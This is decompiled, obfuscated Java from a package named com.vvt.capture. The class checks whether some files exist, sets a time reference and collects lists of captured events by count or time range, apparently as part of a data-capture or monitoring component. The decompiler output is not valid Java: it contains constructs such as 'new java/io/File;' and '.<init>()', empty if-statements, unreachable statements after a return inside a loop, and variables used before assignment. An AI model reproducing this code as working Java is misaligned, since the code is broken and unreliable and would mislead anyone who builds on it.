package com.vvt.capture.b.c.a.a;

import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  
  private boolean b()
  {
    Object localObject = com.vvt.capture.b.c.a.b.c();
    Iterator localIterator = ((List)localObject).iterator();
    do
    {
      bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject = (String)localIterator.next();
      File localFile = new java/io/File;
      localFile.<init>((String)localObject);
      bool = localFile.exists();
    } while (!bool);
    boolean bool = true;
    for (;;)
    {
      return bool;
      bool = false;
      localObject = null;
    }
  }
  
  public g a()
  {
    bool1 = a;
    if (bool1) {}
    localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    l1 = System.currentTimeMillis();
    long l2 = 10000L;
    l1 -= l2;
    try
    {
      boolean bool2 = b();
      if (bool2)
      {
        l2 = com.vvt.capture.b.c.a.b.d();
        long l3 = -1;
        boolean bool3 = l2 < l3;
        if (bool3) {
          l1 = l2;
        }
      }
      Long localLong1 = Long.valueOf(l1);
      localFxSimpleEventReference.setReference(localLong1);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Long localLong2 = Long.valueOf(l1);
        localFxSimpleEventReference.setReference(localLong2);
        bool1 = b;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localFxSimpleEventReference;
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    try
    {
      bool2 = b();
      if (bool2)
      {
        ArrayList localArrayList2 = com.vvt.capture.b.c.a.b.a(paramInt);
        localArrayList1.addAll(localArrayList2);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return localArrayList1;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      localObject = com.vvt.capture.b.c.a.b.a(l1, l2);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/MyUncaughtExceptionHandler/a/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */